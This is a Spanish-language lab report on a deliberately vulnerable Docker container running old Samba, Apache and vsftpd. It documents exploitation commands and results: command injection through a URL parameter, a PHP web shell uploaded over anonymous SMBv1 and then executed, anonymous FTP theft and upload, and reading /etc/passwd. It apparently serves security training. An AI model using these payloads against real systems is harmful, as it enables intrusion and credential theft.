# Contenedor 1: Servicios Vulnerables (`servidor_vulnerable`)

## 1. Descripción General y Versiones Instaladas

Esta imagen está construida sobre **Ubuntu 16.04 (Xenial - EOL)** con versiones antiguas y vulnerables de los servicios **Samba**, **HTTP** y **FTP**:

| Servicio | Versión Instalada | Puerto Host | Vulnerabilidades Principales |
| :--- | :--- | :--- | :--- |
| **Samba (SMB)** | `Samba 4.3.11-Ubuntu` | `1445` / `1139` | Protocolo obsoleto **SMBv1 (`NT1`)**, acceso anónimo sin contraseña con privilegios `root` (`force user = root`) y seguimiento de enlaces simbólicos (`wide links = yes`) hacia el directorio web. |
| **HTTP (Apache)** | `Apache/2.4.18 (Ubuntu)` | `8081` | Exposición de versión exacta (`ServerTokens Full`), **Directory Listing** habilitado en `/backups/` e **Inyección de Comandos (RCE)** en `/index.php`. |
| **FTP (vsftpd)** | `vsftpd 3.0.3 (2016)` | `2121` | Acceso **anónimo habilitado** con permisos de escritura/subida (`anon_upload_enable=YES`), ausencia de jaula (`chroot_local_user=NO`) y credenciales débiles (`usuario:123456`). |

---

## 2. Pruebas de Explotación y Resultados (Entregable Día 1)

### Prueba 1: Reconocimiento de Versiones Antiguas

**Comandos ejecutados:**
```powershell
docker ps
curl.exe -I http://localhost:8081
docker exec servidor_vulnerable smbd --version
```

**Resultado obtenido:**
* La cabecera HTTP expone `Server: Apache/2.4.18 (Ubuntu)`.
* Samba reporta `Version 4.3.11-Ubuntu`.

---

### Prueba 2: Vulnerar el Servicio HTTP (Apache) — Directory Listing + Inyección de Comandos (RCE)

**Objetivo:** Explotar el listado de directorios expuestos en `/backups/` para robar credenciales y lograr Ejecución Remota de Comandos (RCE) en el panel de diagnóstico web.

**Comandos ejecutados:**
```powershell
# 1. Explotar Directory Listing para descubrir y robar respaldos de contraseñas
curl.exe http://localhost:8081/backups/
curl.exe http://localhost:8081/backups/usuarios_backup.txt

# 2. Explotar Inyección de Comandos (RCE) en el parámetro 'host'
curl.exe "http://localhost:8081/index.php?host=127.0.0.1;id;cat+/etc/passwd"
```

**Resultado obtenido:**
* Se extrajo en texto plano la credencial `usuario:123456` desde `/backups/usuarios_backup.txt`.
* El servidor ejecutó los comandos inyectados (`id` y `cat /etc/passwd`), devolviendo `uid=33(www-data)` y la lista completa de usuarios del sistema operativo.

---

### Prueba 3: Vulnerar el Servicio Samba (SMB) — Exfiltración SMBv1 + Subida de WebShell como `root`

**Objetivo:** Aprovechar el protocolo **SMBv1 (`NT1`)** y la sesión nula (anónima) para extraer información confidencial y subir una WebShell PHP al directorio web.

**Comandos ejecutados:**
```powershell
# 1. Enumerar recursos compartidos sin contraseña usando SMBv1 (NT1)
docker exec -it servidor_vulnerable smbclient -L //localhost -N -m NT1

# 2. Extraer el archivo confidencial desde el recurso compartido 'publico'
docker exec -it servidor_vulnerable smbclient //localhost/publico -N -m NT1 -c "ls; get secretos_smb.txt -; quit"

# 3. Subir una WebShell PHP a través de Samba hacia la carpeta web vinculada (web_uploads)
docker exec -it servidor_vulnerable bash -c "echo '<?php system(\$_GET[\"cmd\"]); ?>' > /tmp/shell.php && smbclient //localhost/publico -N -m NT1 -c 'cd web_uploads; put /tmp/shell.php shell.php; quit'"

# 4. Ejecutar código remoto (RCE) invocando la WebShell subida por SMB desde HTTP
curl.exe "http://localhost:8081/uploads/shell.php?cmd=whoami;uname+-a"
```

**Resultado obtenido:**
* Se enumeró el recurso `publico` bajo `Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.11-Ubuntu]`.
* Se exfiltró el archivo `secretos_smb.txt` (`CONFIDENCIAL SMB: Respaldo de claves internas - Token_SMB_Vulnerable_2016`).
* Se subió `shell.php` mediante SMBv1 y se logró ejecución remota de comandos a través de HTTP (`http://localhost:8081/uploads/shell.php`).

---

### Prueba 4: Vulnerar el Servicio FTP (vsftpd) — Acceso Anónimo + Escape de Directorio (Sin `chroot`)

**Objetivo:** Acceder sin credenciales al servidor FTP para robar credenciales de producción, subir archivos arbitrarios y usar la cuenta `usuario:123456` para leer `/etc/passwd` aprovechando la ausencia de `chroot`.

**Comandos ejecutados:**
```powershell
# 1. Acceso FTP Anónimo: descargar archivo confidencial sin usuario ni contraseña
docker exec -it servidor_vulnerable curl ftp://localhost/pub/credenciales_ftp.txt

# 2. Subir un archivo malicioso de forma anónima al servidor FTP
docker exec -it servidor_vulnerable bash -c "echo 'Vulnerado por FTP Anonimo' > /tmp/hack.txt && curl -T /tmp/hack.txt ftp://localhost/pub/archivo_hackeado.txt"

# 3. Aprovechar la falta de chroot (chroot_local_user=NO) con 'usuario:123456' para leer /etc/passwd vía FTP
docker exec -it servidor_vulnerable curl -u usuario:123456 "ftp://localhost/%2fetc/passwd"
```

**Resultado obtenido:**
* El login anónimo permitió descargar `credenciales_ftp.txt` (`CONFIDENCIAL FTP: Acceso base de datos produccion - DB_PASS=admin123`) y subir archivos en `/pub/`.
* Al autenticarse con `usuario:123456`, la ausencia de `chroot` permitió navegar a la raíz del sistema (`%2fetc/passwd`) y extraer el archivo `/etc/passwd` completo por FTP.
